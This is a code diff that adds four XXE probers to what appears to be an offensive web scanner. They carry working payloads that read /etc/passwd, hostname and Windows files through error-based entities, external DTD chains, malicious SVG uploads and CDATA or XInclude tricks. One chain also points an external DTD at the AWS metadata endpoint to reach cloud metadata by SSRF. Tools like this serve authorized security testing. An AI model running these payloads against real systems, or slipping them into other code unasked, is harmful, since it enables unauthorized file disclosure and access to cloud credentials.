@@ -984,6 +984,449 @@ class XXEScanner(BaseScanner):
 
 
 # =============================================================================
+# BlindXXEErrorProber — Error-based data exfil via parameter entities
+# =============================================================================
+
+class BlindXXEErrorProber(BaseScanner):
+    """
+    Error-based XXE data exfiltration.
+
+    Sends payloads that force the XML parser to embed file contents into
+    parse-error messages (classic error-based XXE). Also probes Windows
+    hosts file for universal coverage.
+
+    Techniques:
+    - Parameter entity chain forcing /etc/passwd into error path
+    - Direct entity reference: <!ENTITY xxe SYSTEM "file://..."><root>&xxe;</root>
+    - Windows hosts file detection (127.0.0.1 marker)
+    """
+
+    name = "xxe_blind_error"
+    phase = "offensive"
+
+    # Linux password file fragments that confirm file-read
+    _LINUX_MARKERS = [
+        "root:x:0:0", "nobody:x:", "daemon:x:", "bin:x:", "/bin/bash",
+        "/bin/sh", "/sbin/nologin",
+    ]
+    # Windows hosts file marker
+    _WIN_MARKER = "127.0.0.1"
+
+    _PAYLOADS = [
+        # Error-based parameter entity chain
+        (
+            '<?xml version="1.0"?>'
+            '<!DOCTYPE foo ['
+            '  <!ENTITY % xxe SYSTEM "file:///etc/passwd">'
+            '  %xxe;'
+            ']>'
+            '<root>test</root>'
+        ),
+        # Classic direct entity reference (/etc/passwd)
+        (
+            '<?xml version="1.0"?>'
+            '<!DOCTYPE foo ['
+            '  <!ENTITY xxe SYSTEM "file:///etc/passwd">'
+            ']>'
+            '<root>&xxe;</root>'
+        ),
+        # Hostname file (Linux)
+        (
+            '<?xml version="1.0"?>'
+            '<!DOCTYPE foo ['
+            '  <!ENTITY xxe SYSTEM "file:///etc/hostname">'
+            ']>'
+            '<root>&xxe;</root>'
+        ),
+        # Windows hosts file
+        (
+            '<?xml version="1.0"?>'
+            '<!DOCTYPE foo ['
+            '  <!ENTITY xxe SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts">'
+            ']>'
+            '<root>&xxe;</root>'
+        ),
+    ]
+
+    def __init__(self, session=None, results: Dict = None, debug=False,
+                 config: Optional[SSRFXXEConfig] = None):
+        super().__init__(session, results, debug)
+        self.config = config or SSRFXXEConfig()
+
+    def run(self, url: str, **kwargs) -> Dict:
+        bucket = self.name
+        self.results.setdefault(bucket, [])
+        endpoints: List[str] = kwargs.get("endpoints") or [url]
+        for ep in endpoints:
+            xml_endpoints = _detect_xml_endpoints(ep, self.session)
+            for xep in xml_endpoints[:4]:
+                self._probe(xep, bucket)
+        return self.results
+
+    def _probe(self, url: str, bucket: str):
+        for xml_payload in self._PAYLOADS:
+            resp = _post_xml_payload(self.session, url, xml_payload, timeout=10)
+            if resp is None:
+                continue
+            body = resp.text or ""
+            # Linux passwd detection
+            for marker in self._LINUX_MARKERS:
+                if marker in body:
+                    self.add(bucket, {
+                        "type": "XXE — Blind Error-Based File Read (Linux)",
+                        "severity": "Critical",
+                        "url": url,
+                        "payload_snippet": xml_payload[:120],
+                        "evidence": f"Linux passwd marker '{marker}' found in response: {body[:300]}",
+                    })
+                    logger.warning(f"[XXE-BlindError] Linux file read confirmed at {url}")
+                    return
+            # Windows hosts detection
+            if self._WIN_MARKER in body and ("localhost" in body.lower() or "::1" in body):
+                self.add(bucket, {
+                    "type": "XXE — Blind Error-Based File Read (Windows hosts)",
+                    "severity": "Critical",
+                    "url": url,
+                    "payload_snippet": xml_payload[:120],
+                    "evidence": f"Windows hosts file marker found in response: {body[:300]}",
+                })
+                logger.warning(f"[XXE-BlindError] Windows hosts file read confirmed at {url}")
+                return
+
+
+# =============================================================================
+# DTDInjectionProber — External DTD parameter entity chaining
+# =============================================================================
+
+class DTDInjectionProber(BaseScanner):
+    """
+    External DTD injection via parameter entity chaining.
+
+    Sends payloads that reference an external DTD server. If ctx has an
+    oast_domain it is used as the DTD server; otherwise falls back to the
+    AWS metadata endpoint (169.254.169.254) for a combined SSRF/XXE probe.
+
+    Severity:
+    - Critical if passwd/metadata markers appear in the response (in-band confirm)
+    - High    if DTD reference was accepted (OOB not confirmed)
+    """
+
+    name = "xxe_dtd"
+    phase = "offensive"
+
+    _CHAIN_TEMPLATE = (
+        '<?xml version="1.0"?>'
+        '<!DOCTYPE foo ['
+        '  <!ENTITY % dtd SYSTEM "{DTD_URL}">'
+        '  %dtd;'
+        '  %file;'
+        '  %eval;'
+        '  %error;'
+        ']>'
+        '<root>test</root>'
+    )
+    _SIMPLE_TEMPLATE = (
+        '<?xml version="1.0"?>'
+        '<!DOCTYPE foo ['
+        '  <!ENTITY % dtd SYSTEM "{DTD_URL}">'
+        '  %dtd;'
+        ']>'
+        '<root>test</root>'
+    )
+
+    _CONFIRM_MARKERS = [
+        "root:x:0:0", "nobody:x:", "ami-id", "instance-id", "127.0.0.1",
+    ]
+
+    def __init__(self, session=None, results: Dict = None, debug=False,
+                 config: Optional[SSRFXXEConfig] = None):
+        super().__init__(session, results, debug)
+        self.config = config or SSRFXXEConfig()
+
+    def run(self, url: str, **kwargs) -> Dict:
+        bucket = self.name
+        self.results.setdefault(bucket, [])
+        # Determine DTD server
+        oast_domain = self.config.oast.dns_domain
+        if oast_domain:
+            dtd_urls = [
+                f"http://{oast_domain}/evil.dtd",
+                f"http://{oast_domain}/wrapper.dtd",
+            ]
+        else:
+            # SSRF double-hit: cloud metadata as DTD server
+            dtd_urls = [
+                "http://169.254.169.254/evil.dtd",
+                "http://169.254.169.254/latest/meta-data/",
+            ]
+
+        endpoints: List[str] = kwargs.get("endpoints") or [url]
+        for ep in endpoints:
+            xml_endpoints = _detect_xml_endpoints(ep, self.session)
+            for xep in xml_endpoints[:3]:
+                for dtd_url in dtd_urls:
+                    self._probe(xep, dtd_url, bucket)
+        return self.results
+
+    def _probe(self, url: str, dtd_url: str, bucket: str):
+        for template in (self._CHAIN_TEMPLATE, self._SIMPLE_TEMPLATE):
+            payload = template.replace("{DTD_URL}", dtd_url)
+            resp = _post_xml_payload(self.session, url, payload, timeout=10)
+            if resp is None:
+                continue
+            body = resp.text or ""
+
+            # Check for in-band confirmation
+            for marker in self._CONFIRM_MARKERS:
+                if marker in body:
+                    self.add(bucket, {
+                        "type": "XXE — External DTD Injection (In-Band Confirmed)",
+                        "severity": "Critical",
+                        "url": url,
+                        "dtd_url": dtd_url,
+                        "evidence": f"Marker '{marker}' in response: {body[:300]}",
+                    })
+                    logger.warning(f"[XXE-DTD] DTD injection confirmed at {url} via {dtd_url}")
+                    return
+
+            # Accepted but unconfirmed (no rejection error)
+            if resp.status_code in (200, 400, 500):
+                no_reject = not re.search(
+                    r"DOCTYPE.*not.*allowed|entity.*not.*permitted|external.*entity.*disabled",
+                    body, re.I
+                )
+                if no_reject and resp.status_code == 200:
+                    self.add(bucket, {
+                        "type": "XXE — External DTD Reference Accepted (OOB Unconfirmed)",
+                        "severity": "High",
+                        "url": url,
+                        "dtd_url": dtd_url,
+                        "evidence": (
+                            f"Server responded {resp.status_code} without rejection — "
+                            f"verify OOB in OAST/listener logs for {dtd_url}"
+                        ),
+                        "note": "Confirm OOB DTD fetch in your OAST server logs",
+                    })
+                    logger.info(f"[XXE-DTD] DTD reference accepted at {url}, OOB unconfirmed")
+                    return
+
+
+# =============================================================================
+# SVGXXEProber — XXE via SVG multipart file upload
+# =============================================================================
+
+class SVGXXEProber(BaseScanner):
+    """
+    XXE injection via SVG file upload endpoints.
+
+    Crafts a malicious SVG containing external entity references and uploads
+    it as a multipart form file. Probes common upload endpoints automatically.
+
+    Severity: Critical if passwd/hostname markers appear in the response.
+    """
+
+    name = "xxe_svg"
+    phase = "offensive"
+
+    _SVG_TEMPLATE = (
+        '<?xml version="1.0"?>'
+        '<!DOCTYPE foo ['
+        '  <!ENTITY xxe SYSTEM "{FILE_URI}">'
+        ']>'
+        '<svg xmlns="http://www.w3.org/2000/svg">'
+        '  <text>&xxe;</text>'
+        '</svg>'
+    )
+
+    _TARGET_FILES = [
+        "file:///etc/passwd",
+        "file:///etc/hostname",
+        "file:///etc/hosts",
+        "file:///windows/win.ini",
+        "file:///C:/Windows/win.ini",
+    ]
+
+    _UPLOAD_PATHS = [
+        "/upload", "/api/upload", "/avatar", "/profile/picture",
+        "/api/v1/upload", "/api/avatar", "/media/upload", "/image/upload",
+    ]
+
+    _CONFIRM_MARKERS = [
+        "root:x:0:0", "nobody:x:", "daemon:x:", "/bin/bash",
+        "[fonts]", "for 16-bit", "127.0.0.1",
+    ]
+
+    def __init__(self, session=None, results: Dict = None, debug=False,
+                 config: Optional[SSRFXXEConfig] = None):
+        super().__init__(session, results, debug)
+        self.config = config or SSRFXXEConfig()
+
+    def run(self, url: str, **kwargs) -> Dict:
+        bucket = self.name
+        self.results.setdefault(bucket, [])
+        endpoints: List[str] = kwargs.get("endpoints") or [url]
+        for ep in endpoints:
+            parsed = urlparse(ep)
+            base = f"{parsed.scheme}://{parsed.netloc}"
+            # Always try the provided endpoint itself plus common upload paths
+            upload_targets = [ep]
+            for path in self._UPLOAD_PATHS:
+                upload_targets.append(urljoin(base + "/", path.lstrip("/")))
+            for target in upload_targets:
+                self._probe(target, bucket)
+        return self.results
+
+    def _probe(self, url: str, bucket: str):
+        for file_uri in self._TARGET_FILES:
+            svg_body = self._SVG_TEMPLATE.replace("{FILE_URI}", file_uri).encode("utf-8")
+            try:
+                resp = self.session.post(
+                    url,
+                    files={"file": ("evil.svg", svg_body, "image/svg+xml")},
+                    timeout=10,
+                )
+                body = resp.text or ""
+                for marker in self._CONFIRM_MARKERS:
+                    if marker in body:
+                        self.add(bucket, {
+                            "type": "XXE — SVG Upload File Read",
+                            "severity": "Critical",
+                            "url": url,
+                            "payload_file": file_uri,
+                            "evidence": f"Marker '{marker}' found after SVG upload: {body[:300]}",
+                        })
+                        logger.warning(
+                            f"[XXE-SVG] SVG upload file read confirmed at {url} "
+                            f"reading {file_uri}"
+                        )
+                        return
+            except requests.exceptions.RequestException as exc:
+                logger.debug(f"[XXE-SVG] Upload probe failed for {url} ({file_uri}): {exc!r}")
+
+
+# =============================================================================
+# XXECDATABypassProber — CDATA bypass and XInclude probe
+# =============================================================================
+
+class XXECDATABypassProber(BaseScanner):
+    """
+    CDATA bypass and XInclude XXE probe.
+
+    CDATA bypass wraps file content in CDATA sections to avoid XML parse
+    errors caused by special characters in file content. XInclude uses a
+    completely different XML feature (xi:include) to achieve file read
+    without DOCTYPE at all.
+
+    Severity: Critical if passwd/hostname markers appear in the response.
+    """
+
+    name = "xxe_cdata"
+    phase = "offensive"
+
+    _CDATA_TEMPLATE = (
+        '<?xml version="1.0"?>'
+        '<!DOCTYPE foo ['
+        '  <!ENTITY % start "<![CDATA[">'
+        '  <!ENTITY % file SYSTEM "file://{FILE_PATH}">'
+        '  <!ENTITY % end "]]>">'
+        '  <!ENTITY % dtd SYSTEM "http://{OOB_HOST}/__cdata_wrapper.dtd">'
+        '  %dtd;'
+        ']>'
+        '<root><data>&joined;</data></root>'
+    )
+
+    _XINCLUDE_TEMPLATE = (
+        '<?xml version="1.0"?>'
+        '<root xmlns:xi="http://www.w3.org/2001/XInclude">'
+        '  <xi:include parse="text" href="file://{FILE_PATH}"/>'
+        '</root>'
+    )
+
+    _NAMESPACE_CONFUSION_TEMPLATE = (
+        '<?xml version="1.0"?>'
+        '<data xmlns:xi="http://www.w3.org/2001/XInclude">'
+        '  <xi:include href="file://{FILE_PATH}" parse="text"/>'
+        '</data>'
+    )
+
+    _TARGET_FILES = [
+        "etc/passwd", "etc/hostname", "etc/hosts",
+        "windows/win.ini", "C:/Windows/win.ini",
+    ]
+
+    _CONFIRM_MARKERS = [
+        "root:x:0:0", "nobody:x:", "daemon:x:", "/bin/bash",
+        "[fonts]", "for 16-bit", "127.0.0.1",
+    ]
+
+    def __init__(self, session=None, results: Dict = None, debug=False,
+                 config: Optional[SSRFXXEConfig] = None):
+        super().__init__(session, results, debug)
+        self.config = config or SSRFXXEConfig()
+
+    def run(self, url: str, **kwargs) -> Dict:
+        bucket = self.name
+        self.results.setdefault(bucket, [])
+        oob_host = self.config.oast.dns_domain or _OOB_HOST
+        endpoints: List[str] = kwargs.get("endpoints") or [url]
+        for ep in endpoints:
+            xml_endpoints = _detect_xml_endpoints(ep, self.session)
+            for xep in xml_endpoints[:4]:
+                self._probe_cdata(xep, oob_host, bucket)
+                self._probe_xinclude(xep, bucket)
+        return self.results
+
+    def _probe_cdata(self, url: str, oob_host: str, bucket: str):
+        for fpath in self._TARGET_FILES:
+            payload = (
+                self._CDATA_TEMPLATE
+                .replace("{FILE_PATH}", fpath)
+                .replace("{OOB_HOST}", oob_host)
+            )
+            resp = _post_xml_payload(self.session, url, payload, timeout=10)
+            if resp is None:
+                continue
+            body = resp.text or ""
+            for marker in self._CONFIRM_MARKERS:
+                if marker in body:
+                    self.add(bucket, {
+                        "type": "XXE — CDATA Bypass File Read",
+                        "severity": "Critical",
+                        "url": url,
+                        "payload_file": fpath,
+                        "evidence": f"CDATA bypass marker '{marker}' in response: {body[:300]}",
+                    })
+                    logger.warning(f"[XXE-CDATA] CDATA bypass confirmed at {url} reading {fpath}")
+                    return
+
+    def _probe_xinclude(self, url: str, bucket: str):
+        for fpath in self._TARGET_FILES:
+            for template in (self._XINCLUDE_TEMPLATE, self._NAMESPACE_CONFUSION_TEMPLATE):
+                payload = template.replace("{FILE_PATH}", fpath)
+                resp = _post_xml_payload(self.session, url, payload, timeout=10)
+                if resp is None:
+                    continue
+                body = resp.text or ""
+                for marker in self._CONFIRM_MARKERS:
+                    if marker in body:
+                        self.add(bucket, {
+                            "type": "XXE — XInclude File Read",
+                            "severity": "Critical",
+                            "url": url,
+                            "payload_file": fpath,
+                            "technique": "XInclude (xi:include parse=text)",
+                            "evidence": (
+                                f"XInclude marker '{marker}' in response: {body[:300]}"
+                            ),
+                        })
+                        logger.warning(
+                            f"[XXE-CDATA] XInclude file read confirmed at {url} "
+                            f"reading {fpath}"
+                        )
+                        return
+
+
+# =============================================================================
 # Legacy entry points (backward-compatible with main.py / phases runner)
 # =============================================================================
 
@@ -1041,6 +1484,19 @@ def run_ssrf_xxe_scan(ctx, oast_cfg: Dict = None, **kwargs):
 
     xxe = XXEScanner(session=session, results=results, config=ssrf_xxe_cfg)
     xxe.run(targets[0] if targets else "", endpoints=targets)
+
+    # Deep XXE probers — error-based, DTD injection, SVG upload, CDATA/XInclude
+    blind_err = BlindXXEErrorProber(session=session, results=results, config=ssrf_xxe_cfg)
+    blind_err.run(targets[0] if targets else "", endpoints=targets)
+
+    dtd = DTDInjectionProber(session=session, results=results, config=ssrf_xxe_cfg)
+    dtd.run(targets[0] if targets else "", endpoints=targets)
+
+    svg = SVGXXEProber(session=session, results=results, config=ssrf_xxe_cfg)
+    svg.run(targets[0] if targets else "", endpoints=targets)
+
+    cdata = XXECDATABypassProber(session=session, results=results, config=ssrf_xxe_cfg)
+    cdata.run(targets[0] if targets else "", endpoints=targets)
 
 
 def run(ctx):
